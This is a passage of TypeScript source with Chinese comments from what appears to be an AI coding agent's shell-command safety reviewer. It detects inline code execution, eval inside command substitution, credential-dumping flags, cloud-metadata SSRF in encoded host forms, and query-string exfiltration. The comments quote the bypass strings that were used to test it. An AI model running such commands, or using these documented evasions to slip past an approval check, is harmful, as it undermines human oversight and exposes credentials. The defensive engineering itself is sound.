/** shell 的 `-c` 可与其它短选项组合（如 `-lc` / `-xec`）；返回其命令字符串。 */
function shellCommandPayload(tokens: string[]): string | null {
  if (!SHELL_EXECUTORS.has(executableName(tokens[0]! ?? ''))) return null;
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i]!;
    if (token === '--') return null;
    if (token === '--command') return tokens[i + 1]! ?? '';
    if (token.startsWith('--command=')) return token.slice('--command='.length);
    if (/^-[^-]*c[^-]*$/.test(token)) {
      return tokens[i + 1]! ?? '';
    }
  }
  return null;
}


/**
 * 各解释器「把下一参数当源码执行」的 flag 名。抽成单点是因为有两个消费者:
 * `interpreterInlineCodePayload` 取**载荷**,`analyzeInterpreterArgs` 判**位置**
 * (`python3 -X -c` 里的 `-c` 是 `-X` 的值,不是源码选项)。两边必须同源,否则又会出现
 * 「一个位置无关、一个位置相关」的错配。
 */
function INTERPRETER_INLINE_CODE_FLAGS(bin: string): string[] {
  return /^(?:python|pypy)\d*(?:\.\d+)*$/.test(bin) ? ['-c']
    : /^(?:node|nodejs|bun)$/.test(bin) ? ['-e', '--eval', '-p', '--print']
      : /^(?:ruby|lua|luajit)\d*(?:\.\d+)*$/.test(bin) ? ['-e']
        : bin === 'perl' ? ['-e', '-E']
          : bin === 'php' ? ['-r']
            : /^(?:pwsh|powershell)$/.test(bin) ? ['-c', '-command', '-e', '-encodedcommand']
              : /^(?:r|rscript|julia|groovy|swift|osascript)$/.test(bin) ? ['-e', '--eval']
                : [];
}


/** 常见解释器把下一参数当源码执行的 flag / 子命令。 */
function interpreterInlineCodePayload(tokens: string[]): string | null {
  const bin = executableName(tokens[0]! ?? '');
  if (bin === 'deno' && tokens[1]!?.toLowerCase() === 'eval') return tokens[2]! ?? '';
  const flags = INTERPRETER_INLINE_CODE_FLAGS(bin);
  // 两遍扫描:**先把所有 flag 的精确匹配试完,再试紧贴值形态**。
  // 单遍按 flag 顺序会让短选项的紧贴分支抢在长选项的精确匹配之前 —— pwsh 的 `-Command`
  // 被 `-c` 当成「紧贴值 `ommand`」吃掉,于是拿不到真正的载荷,
  // `xargs -I{} pwsh -Command '{}'` 这类占位符注入源码的形态判不出来(review 七轮)。
  for (let i = 1; i < tokens.length; i++) {
    const lower = (tokens[i]! as string).toLowerCase();
    for (const flag of flags) {
      if (lower === flag.toLowerCase()) return tokens[i + 1]! ?? '';
    }
  }
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i]! as string;
    const lower = token.toLowerCase();
    for (const flag of flags) {
      const normalizedFlag = flag.toLowerCase();
      if (normalizedFlag.startsWith('--') && lower.startsWith(`${normalizedFlag}=`)) {
        return token.slice(flag.length + 1);
      }
      if (normalizedFlag.length === 2 && lower.startsWith(normalizedFlag) && token.length > 2) {
        return token.slice(flag.length);
      }
    }
  }
  return null;
}


// 静态审查的递归深度上限:命令替换/shell -c/xargs·parallel 包装每层递增一次,超过即认定结构已
// 不可静态求证,fail-closed(见各调用点)。取 6 兼顾现实嵌套(3-4 层已属极端)与 DoS 边界。
const MAX_EXEC_REVIEW_DEPTH = 6;


/**
 * 提取命令替换 `$(…)` / 进程替换 `<(…)` / 反引号 的**外层**内层文本,`$(`·`<(` 按括号深度取
 * 平衡子串。单层正则只抓到最内层,令外层 eval/下载执行逃过确定性红线
 * (greptile 报 `echo $(eval "$(echo payload)")`);返回外层体后,递归调用者会再拆其中的内层。
 */
function substitutionBodies(text: string): string[] {
  const out: string[] = [];
  for (let i = 0; i < text.length; i++) {
    // `$(` 命令替换、`<(`/`>(` 进程替换(输入与**输出**两向都会起子进程执行,greptile 报 `echo >(eval "$X")`)。
    const opensParen = (text[i]! === '$' || text[i]! === '<' || text[i]! === '>') && text[i + 1]! === '(';
    if (opensParen) {
      // 括号计数必须**跳过引号内的字面括号**:否则 `$(eval 'touch; #(')` 里引号内的 `(` 会抬高深度、
      // 让外层 `$(` 永远闭合不了,替换体取不出、内层 eval 逃过红线(greptile 报)。
      let depth = 1;
      let j = i + 2;
      let sq = false;
      let dq = false;
      let esc = false;
      for (; j < text.length && depth > 0; j++) {
        const c = text[j]!;
        if (esc) { esc = false; continue; }
        if (c === '\\' && !sq) { esc = true; continue; }
        if (c === "'" && !dq) { sq = !sq; continue; }
        if (c === '"' && !sq) { dq = !dq; continue; }
        if (sq || dq) continue;
        // shell 注释:`#` 在词首(行首/空白/**任一未引用 metacharacter** 之后:`( ) ; & | < >` 等)起注释到
        // 行尾,其中的 `)` 是字面不是替换体终点(greptile 报 `$(echo ok # )…` 与 `$( (echo ok)# )…`,后者 `#`
        // 前是 `)`)→ 跳到换行,避免注释里的 `)` 提前截断。
        if (c === '#' && (j === i + 2 || /[\s(){}<>;&|]/.test(text[j - 1]!))) {
          while (j + 1 < text.length && text[j + 1]! !== '\n') j++;
          continue;
        }
        if (c === '(') depth++;
        else if (c === ')') depth--;
      }
      if (depth === 0) {
        out.push(text.slice(i + 2, j - 1));
        i = j - 1; // 跳过整个外层替换,内层交给递归拆解
      }
      continue;
    }
    if (text[i]! === '`') {
      // 找配对反引号时必须跳过**转义**反引号(`\``):嵌套反引号替换靠转义定界
      // (`` `echo \`eval "$X"\`` ``),把 `\`` 当外层终点会截断替换体、漏掉内层 eval(greptile 报)。
      let end = -1;
      for (let j = i + 1; j < text.length; j++) {
        if (text[j]! === '\\') { j++; continue; }
        if (text[j]! === '`') { end = j; break; }
      }
      if (end > i) {
        // 内层体里的 `\`` 还原成 `` ` ``,让递归能继续按普通反引号拆下一层。
        out.push(text.slice(i + 1, end).replace(/\\`/g, '`'));
        i = end;
      }
    }
  }
  return out;
}


type ShellReviewOptions = {
  cwd?: string;
  cwdUnknown?: boolean;
  platform?: NodeJS.Platform;
  /** 明确可写根；缺省保持历史语义，仅 workspaceRoots[0] 可写。 */
  writableRoots?: readonly string[];
  /** reviewAction 才能声明执行端证据；直接分类调用保持兼容的纯字符串语义。 */
  destructivePathResolution?: 'host' | 'unavailable' | 'lexical';
  /** 仅由分享任务传入；存在时允许解析 Git 配置覆盖并交给调用方核实。 */
  gitContentRead?: (read: GitRead) => boolean;
  gitConfigRead?: (read: GitRead) => boolean;
};


/**
 * 交给调用方核实的一次 git 调用：查看内容又没有静态限定到具体文件(git diff、git log -p、git grep 等)，
 * 或会打出 git 配置与保存的凭证(git remote -v、git config --list、git credential fill 等)。
 */
export type GitRead = {
  sub: string;
  /** 子命令之后的参数(已去引号)。 */
  args: readonly string[];
  /** git 实际运行的目录(已跟随前面各段的 cd 与 -C)；认不出时为 undefined。 */
  cwd?: string;
  usesInheritedGitRuntime?: boolean;
  metadataOnly?: boolean;
  /**
   * 当前 git 读取前是否有无法证明只读的 shell 段。前置段可能先修改工作区或索引，
   * 因而使执行器在命令运行前取得的凭证扫描结果过时；调用方应拒绝凭证豁免。
   */
  priorSegmentsMayMutate?: boolean;
};


/**
 * shellCommandReadsCredentials 的附加选项：只供供应商分享的受邀者任务确认凭证用
 * (apps/orchestrator/src/hosted-agent-credentials.ts)。本机任务的自动审查不传，判定不变。
 */
export type CredentialCommandOptions = ShellReviewOptions & {
  credentialTextTransform?: (text: string) => string;
  fileReadRequiresConsent?: (read: {
    operand: string;
    cwd?: string;
    priorSegmentsMayMutate: boolean;
  }) => boolean;
  /** rg -g、grep --include 这类搜索范围只选中源码与文档扩展名时不算读取凭证。 */
  sourceFileSelectors?: boolean;
  ripgrepConfigActive?: boolean;
  /**
   * git 查看内容又没有限定到具体文件时默认按可能读到提交进仓库的凭证处理；提供时先问调用方，
   * 返回 true 表示调用方已核实这次调用读不到凭证类文件。
   */
  gitContentRead?: (read: GitRead) => boolean;
  /**
   * 会打出 git 配置(远程地址、http 头等)或保存的凭证的调用默认不算；提供时交给调用方，返回 false 表示
   * 这次调用要按读取凭证处理。认不出子命令所在目录时 cwd 为 undefined。
   */
  gitConfigRead?: (read: GitRead) => boolean;
};


/**
 * PowerShell 改当前位置的 cmdlet 与别名。`cd` / `chdir` 在 cmd.exe 与 PowerShell 里语义一致,
 * 早先只认 `cd`/`pushd`(POSIX 名字),于是
 * `Set-Location C:\Windows\System32; Set-Content payload.txt owned` 的相对目标仍按工作区解析、
 * 整条落灰区(codex 报)。**同一条命令换个 cmdlet 名字判档就不同**,这里把三个入口补齐:
 *   · `Set-Location` / `sl` / `chdir` → 同 `cd`;
 *   · `Push-Location` → 同 `pushd`;
 *   · `Pop-Location` → 同 `popd`(回到栈上一层 = 运行期状态 → cwd 未知,fail closed)。
 * `Get-Location` 只读,不在此列。
 */
const POWERSHELL_SET_LOCATION: ReadonlySet<string> = new Set(['set-location', 'sl', 'chdir']);


/**
 * PowerShell 的 `-Path:<路径>` / `-LiteralPath:<路径>` 把值**贴在**参数上,不占一个 token。按
 * "以 `-` 开头就跳过"处理等于"没给目标"→ cwd 变未知 → 后续**区内**相对写会被误升级成硬弹窗。
 * 前缀歧义(`-p:` 同时命中 `-Path`/`-PSPath`)时返回 undefined,走原来的"没给目标"分支 = fail closed。
 */
function powerShellLocationAttachedTarget(token: string): string | undefined {
  const name = token.split(/[:=]/)[0]!.toLowerCase();
  if (token.length === name.length) return undefined;   // 没有贴值
  const known = POWERSHELL_PATH_PARAMS;
  const matched = known.includes(name)
    ? [name]
    : name.length >= 2 ? known.filter((p) => p.startsWith(name)) : [];
  return matched.length === 1 ? token.slice(name.length + 1) : undefined;
}


/**
 * 位置 cmdlet 上一个选项**要不要吃掉下一个 token**。少了这一步就会把带值选项的值当成新 cwd:
 * `Push-Location -StackName foo -Path <系统目录>` 里 `foo` 被当成位置、真正的 `-Path` 反而没被看,
 * 于是后续相对写按工作区解析(codex 报;这是上一提交新加的 parser 自己的 bug)。
 *
 *   · `target-next`  下一个 token 就是要切到的位置(`-Path` / `-LiteralPath` 一族)。
 *   · `consumes-value` 带值的非路径选项(`-StackName`、`-ErrorAction` 等 common parameters)→ 吃掉值。
 *   · `standalone`   开关(`-PassThru`/`-Verbose`…),或值已贴在参数上 → 不吃下一个 token。
 *   · `unprovable`   证不出它吃不吃值 / 它是不是 `-Path` → 位置无法确定,cwd 判未知(fail closed)。
 */
type LocationOptionKind = 'target-next' | 'consumes-value' | 'standalone' | 'unprovable';


function powerShellLocationOptionKind(token: string, posixFlagsWin = false): LocationOptionKind {
  const name = token.split(/[:=]/)[0]!.toLowerCase();
  const attached = token.length > name.length;
  // `cd` / `pushd` 这两个名字在 POSIX 是 shell 内建、在 PowerShell 是 Set-Location/Push-Location 的
  // 别名,同一个 token 两种文法。**单字母**选项按 POSIX 开关处理(`cd -P /ws/build`、`pushd -n`),
  // 多字母的才按 PowerShell 参数解析(`cd -ErrorAction Stop <路径>`)—— POSIX 的 cd/pushd 没有多字母
  // 选项,所以这条分界不会改动 POSIX 侧任何既有判档。
  if (posixFlagsWin && name.length <= 2) return 'standalone';   // `-P` / `-L` / `-n` / `-e`
  const known = [
    ...POWERSHELL_TARGET_PARAMS, ...POWERSHELL_VALUE_PARAMS, ...POWERSHELL_SWITCH_PARAMS,
  ];
  // 精确写法优先于前缀,与写目标提取同一套口径。
  const candidates = known.includes(name)
    ? [name]
    : name.length >= 2 ? known.filter((p) => p.startsWith(name)) : [];
  if (candidates.length === 0) {
    // 未知选项:贴值不会错位;不贴值就证不出它有没有吃掉后面那个 token。
    return attached ? 'standalone' : 'unprovable';
  }
  if (candidates.every((p) => POWERSHELL_SWITCH_PARAMS.includes(p))) return 'standalone';
  if (attached) return 'standalone';  // 唯一的路径参数贴值已在上面被当成目标取走
  const paths = candidates.filter((p) => POWERSHELL_PATH_PARAMS.includes(p));
  if (paths.length === candidates.length) return 'target-next';
  // 候选里既有路径参数又有别的 → 下一个 token 是位置还是选项值,证不出来。
  return paths.length > 0 ? 'unprovable' : 'consumes-value';
}


function directoryChangeTarget(tokens: string[]): { changesDirectory: boolean; target?: string } {
  // executableName 归一大小写/.exe:Windows cmd/PowerShell 大小写不敏感,`CD /` 的 cwd 变更不能漏识别
  // (copilot 报:漏了会把后续相对破坏目标误当仍在工作区内)。
  const bin = executableName(tokens[0]! ?? '');
  if (bin === 'source' || bin === '.' || bin === 'popd' || bin === 'pop-location') {
    return { changesDirectory: true };
  }
  const pushLike = bin === 'pushd' || bin === 'push-location';
  if (bin !== 'cd' && !pushLike && !POWERSHELL_SET_LOCATION.has(bin)) {
    return { changesDirectory: false };
  }
  // POSIX `pushd -n` 只压栈、不切目录。PowerShell 的 Push-Location 没有这个开关。
  if (bin === 'pushd' && tokens.slice(1).includes('-n')) return { changesDirectory: false };
  // 位置 cmdlet 有带值选项(`-StackName`、common parameters),必须先消费掉再挑位置。
  // `cd` / `pushd` 也是 Set-Location / Push-Location 的**别名**,同样要按 PowerShell 文法解析
  // (`pushd -StackName foo -Path <系统目录>` 修前把 `foo` 当 cwd,codex 报);它们又同时是 POSIX
  // 的 shell 内建,所以单字母选项按 POSIX 开关处理,见 powerShellLocationOptionKind。
  const posixFlagAliases = bin === 'cd' || bin === 'pushd';
  let optionsEnded = false;
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i]!;
    if (!optionsEnded && token === '--') {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && token.startsWith('-') && token !== '-') {
      const attached = powerShellLocationAttachedTarget(token);
      if (attached !== undefined) return { changesDirectory: true, target: attached };
      const kind = powerShellLocationOptionKind(token, posixFlagAliases);
      if (kind === 'unprovable') return { changesDirectory: true };
      if (kind === 'consumes-value') {
        const value = tokens[i + 1]!;
        if (value !== undefined && !value.startsWith('-')) i += 1;
        continue;
      }
      if (kind === 'standalone') continue;
      // target-next:下一个 token 就是位置;缺值 = 没给出位置 → cwd 未知。
      const value = tokens[i + 1]!;
      return value === undefined || value.startsWith('-')
        ? { changesDirectory: true }
        : { changesDirectory: true, target: value };
    }
    // pushd +/-N rotates the directory stack; the resulting cwd is runtime state.
    if (bin === 'pushd' && /^[+-]\d+$/.test(token)) {
      return { changesDirectory: true };
    }
    return { changesDirectory: true, target: token };
  }
  return { changesDirectory: true };
}


/**
 * 抽出 find `-exec`/`-execdir`/`-ok`/`-okdir` 各段的完整命令 argv(到 `;`/`\;`/`+` 止)。
 * `dirRelative` 标记 `-execdir`/`-okdir`:它们在**每个被匹配文件所在目录**里执行,相对目标的实际
 * cwd 随匹配项变动、静态不可证(codex 报 `find /ws/x -execdir rm -rf x` 实际删的是 /ws/x 整体)。
 */
function findExecCommands(tokens: string[]): { argv: string[]; dirRelative: boolean }[] {
  const out: { argv: string[]; dirRelative: boolean }[] = [];
  const execFlags = new Set(['-exec', '-execdir', '-ok', '-okdir']);
  for (let i = 0; i < tokens.length; i++) {
    const flag = tokens[i]!.toLowerCase();
    if (!execFlags.has(flag)) continue;
    const rest: string[] = [];
    for (let j = i + 1; j < tokens.length; j++) {
      const tok = tokens[j]!;
      if (tok === ';' || tok === '\\;' || tok === '+') break;
      rest.push(tok);
    }
    if (rest.length > 0) out.push({ argv: rest, dirRelative: flag === '-execdir' || flag === '-okdir' });
  }
  return out;
}


/**
 * 把遍历根具化成一个静态的「被匹配路径」:根在区内 → 哨兵在区内;根是 `/etc` → 哨兵落 `/etc`,
 * 从而让占位目标保持「作用域由遍历根决定」的语义。根本身不可静态解析(变量/glob/`~`,或相对根
 * 且有效 cwd 未知)时返回 `null` → 调用方 fail-closed。
 */
/**
 * 把 argv 还原成命令字符串给递归审查用。**逐 token 单引号**包裹:载荷本身通常已含双引号
 * (`sh -c 'rm -rf "$1"'`),用 JSON 双引号序列化会把它们转义成 `\"`,再 tokenize 时反斜杠被保留、
 * 目标残成 `\"/path\"` 而失真;单引号内 tokenize 不做反斜杠处理,能原样取回 token。
 */
function shellQuoteArgvForReview(tokens: string[]): string {
  return tokens.map((t) => `'${t.replace(/'/g, "'\\''")}'`).join(' ');
}


function isSafeReadonlyBin(bin: string, segment: string, tokens: string[]): boolean {
  if (!SAFE_READONLY_BINS.has(bin)) return false;
  // 以下 flag 检测都跑在**去引号标记**的 segment 上(见 classifyShellSegment),防 -ex'ec' / -'o' 拼接绕过。
  // find 的执行/删除/写文件 flag:-exec/-delete/-fprintf/-fls(-print/-ls 写 stdout,仍算只读)。
  if (bin === 'find' && /-(?:exec(?:dir)?|ok(?:dir)?|delete)\b|-f(?:print[f0]?|ls)\b/.test(segment)) return false;
  // sort:-o/--output 写文件;--compress-program 会运行任意外部程序(RCE)。GNU sort 接受唯一前缀缩写
  // (`--compress-prog` / `--compress-p`,codex 报),故按前缀匹配 —— `--o…`(仅 --output)与 `--compress…`
  // (仅 --compress-program)开头的长选项一律拦(短选项 -o 单列)。
  if (bin === 'sort' && /(?:^|\s)(?:-o\b|-o\S|--o[a-z-]*\b|--compress[a-z-]*\b)/.test(segment)) return false;
  // base64(BSD/macOS `-o <file>` 把解码内容写任意文件)、tree(`-o <file>` 把树输出写文件)—— -o/--output 落盘。
  if ((bin === 'base64' || bin === 'tree') && /(?:^|\s)(?:-o\b|-o\S|--output\b)/.test(segment)) return false;
  // ripgrep 跑外部程序的 flag:--pre=CMD(预处理器)、--hostname-bin=CMD(取 hostname 供超链接)= RCE。
  // --pre-glob 无害不拦。
  if (bin === 'rg' && (/--pre(?:=|\s|$)/.test(segment) || /--hostname-bin\b/.test(segment))) return false;
  // jq/yq:-i/--in-place 就地改文件;env/$ENV/strenv 读取注入的凭证环境变量(与 shell $VAR 同等泄漏面)。
  if (bin === 'yq' || bin === 'jq') {
    if (/(?:^|\s)-i\b|(?:^|\s)--in-?place\b/.test(segment)) return false;
    if (/(?<!\.)\b(?:env|strenv)\b|\$ENV\b/.test(segment)) return false;
  }
  // uniq 的第二个位置参数是输出文件(写)。计数用 tokens(全引号参数已剥),对拼接引号同样稳健。
  if (bin === 'uniq' && tokens.slice(1).filter((t) => !t.startsWith('-')).length >= 2) return false;
  // ps 显示环境变量(BSD 裸选项簇含 `e`:`ps eww` / `ps auxe` / `ps e`;或 `-E` / `--environment`)
  // 会 dump 整个进程环境 —— 含注入子进程的 provider API key(见 env-builder),是凭证外泄面,不放行。
  // `-e`(dash + 小写 e = 选所有进程)是常用且安全形态,大小写敏感区分,不误伤。
  if (bin === 'ps') {
    const dumpsEnv = tokens.slice(1).some((t) => {
      if (t.startsWith('--')) return /^--environ/.test(t);        // --environment
      if (t.startsWith('-')) return t.includes('E');              // -E(大写)= 环境;-e(小写)= 选进程,安全
      return /^[A-Za-z]+$/.test(t) && t.includes('e');            // BSD 裸选项簇含 e
    });
    if (dumpsEnv) return false;
  }
  return true;
}


/**
 * sed 的**纯读文件**形态(`sed -n 495,545p file`):agent 最高频的分页读文件方式,实机语料
 * 里大量出现,不该每次都进灰区审阅。只放行静态可证只读的窄子集:
 *   - flag 仅允许 -n/-E/-r(及其组合);-i/-e/-f/-s 等一律不放(改文件/多脚本/脚本文件);
 *   - 脚本操作数必须是**纯数字地址 + p**(`1p`、`1,80p`、`10,$p`)—— 正则地址、s///、w、e 等
 *     全部落灰区(w 写文件、e 执行命令,正则地址静态难证边界);
 *   - 其余操作数是输入文件(读凭证文件由 ALWAYS_ASK_PATTERNS 在整条命令上先行拦截)。
 */
function isSafeReadonlySed(tokens: string[]): boolean {
  let script: string | null = null;
  for (const t of tokens.slice(1)) {
    if (t === '--') continue;
    if (t.startsWith('-')) {
      if (!/^-[nEr]+$/.test(t)) return false;
      continue;
    }
    if (script === null) {
      script = t;
      continue;
    }
    // 文件操作数:任意路径都可(只读);凭证路径已被整条命令级红线拦下。
  }
  return script !== null && /^\d+(?:,(?:\d+|\$))?p$/.test(script);
}


/**
 * gh CLI 的只读子命令(`gh pr view` / `gh issue list` / `gh run list` 等):纯查询、不改远端
 * 状态,实机语料的高频段。放行条件:
 *   - `gh <command> <subcommand>` 精确命中白名单读操作对(`gh api` **不在列** —— 可发任意
 *     mutation;`gh pr create/merge/close` 等写操作不在列);
 *   - 不带 `--web`/`-w`(转浏览器打开,行为出静态审查面,fail-closed 不放)。
 * 查询串发往 GitHub API 属用户自己账号的读操作,与 isSafeFetch 拦的「GET 查询串 exfil」
 * 不同源(攻击者读不到用户的查询),不因带 --search 升级。
 */
const SAFE_GH_READONLY_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['pr', new Set(['view', 'list', 'diff', 'checks', 'status'])],
  ['issue', new Set(['view', 'list', 'status'])],
  ['run', new Set(['view', 'list'])],
  ['release', new Set(['view', 'list'])],
  ['repo', new Set(['view'])],
  ['workflow', new Set(['view', 'list'])],
  ['label', new Set(['list'])],
  ['gist', new Set(['view', 'list'])],
  ['search', new Set(['repos', 'issues', 'prs', 'code', 'commits'])],
  ['auth', new Set(['status'])],
]);


function isSafeReadonlyGh(tokens: string[]): boolean {
  const command = tokens[1]!;
  const sub = tokens[2]!;
  if (!command || command.startsWith('-') || !sub || sub.startsWith('-')) return false;
  const safeSubs = SAFE_GH_READONLY_SUBCOMMANDS.get(command.toLowerCase());
  if (!safeSubs || !safeSubs.has(sub.toLowerCase())) return false;
  return tokens.slice(3).every((t) => {
    // --web 把结果转到浏览器打开,行为出静态审查面。
    // 等号形态 `--web=true` 是同一个 flag,gh 照常接受(review 报)。
    if (/^--web(?:$|=)/.test(t)) return false;
    // `gh auth status --show-token` 会把**可复用的 GitHub 令牌**打进工具输出、进而进模型
    // 上下文 —— 这是凭证读取,必须逐次确认,不能因为 `auth status` 在只读表里就放行
    // (review P1)。等号形态 `--show-token=true` 是同一个 flag,必须一并拦(review 二轮)。
    if (/^--show-token(?:$|=)/.test(t)) return false;
    // 短选项可簇写(`-wt`、`-tw`),按**包含**判定 fail-closed:`w` = --web,`t` = --show-token。
    if (/^-[a-zA-Z]*[wt]/.test(t)) return false;
    return true;
  });
}


/**
 * curl/wget 的只读 GET → 放行(命令行浏览器场景;stdout 默认)。放行条件全部满足:
 *   - 无上传 / 非 GET 方法(bin 各自的 upload flag),无落盘到文件(-o/-O/--output);
 *   - **能认出一个 URL/host 目标**——认不出(无位置参数 / 参数不像 URL)一律 fail-closed 升级,
 *     不因"没识别出危险"而放行(修 copilot 报的 no-scheme/no-URL 漏放);
 *   - **目标 URL 无查询串**:`?…=…` 可能把数据编码进 URL 外发(GET 型 exfil,不需 -d/-F),含无 scheme 的
 *     `host/path?q=` 形态。命令替换 `$(...)` 另有 COMMAND_SUBSTITUTION 拦截。
 */
/** curl/wget 的 URL/host 目标 token(有 scheme、无 scheme host、localhost、IPv4)。 */
function isFetchTargetToken(t: string): boolean {
  return (
    /^https?:\/\//i.test(t) ||                            // 仅 http(s):// 算安全 fetch 目标(file://scp://ftp:// 等另拦)
    /^[\w.-]+\.[a-z]{2,}(?:[:/].*)?$/i.test(t) ||         // 无 scheme 的 host[/path][:port]
    /^localhost(?::\d+)?(?:[/?].*)?$/i.test(t) ||         // localhost[:port]
    /^\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?(?:[/?].*)?$/.test(t) // IPv4[:port]
  );
}


/**
 * 内网 / 环回 / 链路本地(含云 metadata 169.254.169.254)/ *.internal —— 抓取即敏感,一律升级:
 * SSRF 打云 metadata 会把实例凭证读进模型上下文,localhost/内网服务数据同理。公网 host 才当"命令行浏览器"放行。
 *
 * **已知限制(静态不可闭合):只按 URL 里的字面 host/IP 判定,不做 DNS 解析。** 攻击者控制的域名或
 * DNS 重绑定(public.example → 169.254.169.254)静态无法识别 —— 解析要真发 DNS(非确定、侧信道、
 * 且这正是 fetch 本身要做的事)。这类残口(与符号链接、-L 重定向同源)应由网络出口过滤(禁 link-local /
 * RFC1918 出站)在网络层堵,不在命令字符串审查层。前提也需模型去抓一个攻击者控制的域名。
 */
/**
 * 按 curl/inet_aton 规则解析一个数字型 host 分量:`0x`/`0X` 前缀=十六进制,前导 `0`=八进制,否则十进制。
 * 畸形(如含 8/9 的"八进制" `08`)返回 null,由调用方 fail-closed 处理。
 */
function parseNumericHostComponent(p: string): number | null {
  if (/^0[xX][0-9a-fA-F]+$/.test(p)) return parseInt(p.slice(2), 16);
  if (/^0[0-7]+$/.test(p)) return parseInt(p, 8);
  if (p === '0') return 0;
  if (/^[1-9]\d*$/.test(p)) return Number(p);
  return null;
}


/** host 归一用:NUL 及其后全部(curl 在 NUL 处截断);以及嵌入的控制字符/空白(curl 会剥掉)。 */
const NUL_AND_REST = new RegExp(`${String.fromCharCode(0)}[\\s\\S]*$`);

const HOST_CONTROL_CHARS = new RegExp('[\\s\\u0000-\\u001f\\u007f]', 'g');


/**
 * 内网判定必须在 **百分号解码后**的 host 上做:curl/浏览器把 `%31%36%39.%32%35%34.…` 归一成
 * `169.254.169.254` 再发请求(codex 的 `curl -sv` 探针确认请求行与 Host 都已归一),而未解码的字符串
 * 既不像 IPv4 也不像 localhost —— 会被 isSafeFetch **确定性 auto-approve**(静默放行,比降灰区更糟)。
 * 逐轮解码(≤3 轮,覆盖 `%2531` 这类双重编码),任一形态命中内网即算内网;解码失败(`%zz` 等畸形
 * 序列)静态不可证清白 → fail-closed。
 */
function isInternalFetchTarget(t: string): boolean {
  if (t.length > MAX_AUTO_REVIEW_ACTION_TEXT_CHARS) return true;
  const forms: string[] = [t];
  let cur = t;
  for (let round = 0; round < 3 && /%[0-9a-fA-F]{2}/.test(cur); round++) {
    let decoded: string;
    try {
      decoded = decodeURIComponent(cur);
    } catch {
      return true;
    }
    if (decoded === cur) break;
    cur = decoded;
    forms.push(cur);
  }
  return forms.some(isInternalFetchHostForm);
}


/** 从 fetch 目标里取归一后的 host(去 scheme/path/userinfo/port、NUL 截断、控制字符、尾随点)。 */
function fetchHostOf(t: string): string {
  return t
    .replace(/^[a-z][\w+.-]*:\/\//i, '') // 去 scheme
    .replace(/[/?#].*$/, '')             // 去 path/query/fragment
    .replace(/^[^@]*@/, '')              // 去 userinfo
    .replace(/:\d+$/, '')                // 去端口
    // NUL 截断与控制字符/空白:解码后可能出现 `169.254.169.254\0.example.com` 或嵌入的
    // TAB/CR/LF —— curl 在此截断或剥掉,不归一会让内网 host 伪装成外网域名(与编码同类绕过)。
    .replace(NUL_AND_REST, '')
    .replace(HOST_CONTROL_CHARS, '')
    .replace(/\.+$/, '')                 // 去尾随点(FQDN 根点)
    .toLowerCase();
}


/**
 * 取 host 的 IPv4 前两字节(内网/metadata 判定只需前两段)。支持点分、缩写形(127.1)、整数
 * (2852039166)与十六进制(0xA9FEA9FE);每个分量按 curl/inet_aton 进制规则解析(前导 0=八进制)。
 * `unprovable: true` 表示是数字型 host 但非规范(如畸形八进制 08)—— 调用方应 fail-closed。
 */
function fetchHostIpv4Prefix(host: string): { a: number; b: number; unprovable?: boolean } | null {
  const NUMERIC = /^(?:0[xX][0-9a-fA-F]+|\d+)$/;
  const parts = host.split('.');
  if (parts.length >= 2 && parts.length <= 4 && parts.every((q) => NUMERIC.test(q))) {
    const p0 = parseNumericHostComponent(parts[0]!);
    const p1 = parseNumericHostComponent(parts[1]!);
    if (p0 === null || p1 === null) return { a: -1, b: -1, unprovable: true };
    // 两段式 a.B24:B24 高 8 位是第二字节(inet_aton 规则)。
    return { a: p0, b: parts.length === 2 ? (p1 >>> 16) & 255 : p1 };
  }
  if (NUMERIC.test(host)) {
    const n = parseNumericHostComponent(host);
    if (n === null) return { a: -1, b: -1, unprovable: true };
    if (n >= 0 && n <= 0xffffffff) return { a: (n >>> 24) & 255, b: (n >>> 16) & 255 };
  }
  return null;
}


/**
 * 云 metadata 端点(而非泛内网):抓它等于读取实例的临时云凭证 —— 静态可证的高危,两条通道
 * (内置 WebFetch 与 shell curl/wget)都必须确定性同意。
 *
 * **刻意只含 metadata、不含 localhost/私网**:`curl localhost:3000` 是开发日常,把它一并硬弹窗会
 * 违反 Auto-review「尽量不打扰」的第一承诺;localhost/私网仍走灰区交模型裁决。
 * 复用 isInternalFetchTarget 的百分号解码外壳,编码形态同样命中。
 */
function isCloudMetadataFetchTarget(t: string): boolean {
  const forms: string[] = [t];
  let cur = t;
  for (let round = 0; round < 3 && /%[0-9a-fA-F]{2}/.test(cur); round++) {
    let decoded: string;
    try {
      decoded = decodeURIComponent(cur);
    } catch {
      return false; // 畸形序列由 isInternalFetchTarget 兜成内网(灰区),这里不另判红线
    }
    if (decoded === cur) break;
    cur = decoded;
    forms.push(cur);
  }
  return forms.some((form) => {
    const host = fetchHostOf(form);
    if (host === 'metadata.google.internal' || host.endsWith('.internal')) return true;
    const ip = fetchHostIpv4Prefix(host);
    return ip !== null && ip.a === 169 && ip.b === 254; // 链路本地:含 169.254.169.254
  });
}


function isInternalFetchHostForm(t: string): boolean {
  const host = fetchHostOf(t);
  if (host === 'localhost' || host.endsWith('.localhost') || host === '0.0.0.0' || host === '::1') return true;
  if (host === 'metadata.google.internal' || host.endsWith('.internal')) return true;
  if (host.startsWith('[')) return true; // IPv6 字面量(环回/私网难精确,保守升级)
  const ip = fetchHostIpv4Prefix(host);
  if (ip === null) return false;
  if (ip.unprovable) return true;        // 非规范数字 host → 保守视为内网升级
  const { a, b } = ip;
  if (a === 127 || a === 10 || a === 0) return true;    // 环回 / 10.0.0.0-8 / 0.0.0.0-8
  if (a === 169 && b === 254) return true;              // 链路本地 + 云 metadata 169.254.169.254
  if (a === 172 && b >= 16 && b <= 31) return true;     // 172.16.0.0-12
  if (a === 192 && b === 168) return true;              // 192.168.0.0-16
  return false;
}


function isSafeFetch(bin: string, segment: string, tokens: string[]): boolean {
  // 只有 curl 可能是"只读浏览器"(默认写 stdout、默认不跟随重定向)。wget 默认把内容写进本地文件
  // 且默认跟随重定向(最终 host 不可判)→ 一律升级,不当安全 fetch。
  if (bin !== 'curl') return false;
  if (FETCH_OUTPUT_FLAGS.test(segment)) return false;     // -o/-O 落盘
  if (CURL_UPLOAD_FLAGS.test(segment) || CURL_NONGET_METHOD.test(segment)) return false; // -d/-F/--json 上传、非 GET 方法
